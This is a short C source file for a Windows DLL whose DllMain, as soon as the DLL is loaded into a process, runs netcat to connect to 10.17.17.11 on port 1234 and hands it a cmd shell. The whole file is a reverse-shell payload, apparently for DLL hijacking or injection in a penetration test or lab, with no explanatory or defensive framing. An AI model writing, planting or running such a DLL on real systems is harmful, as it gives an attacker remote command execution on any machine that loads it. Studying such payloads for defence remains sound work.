#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("C:\\tools\\nc64.exe 10.17.17.11 1234 -e cmd");
    }

    return TRUE;
}
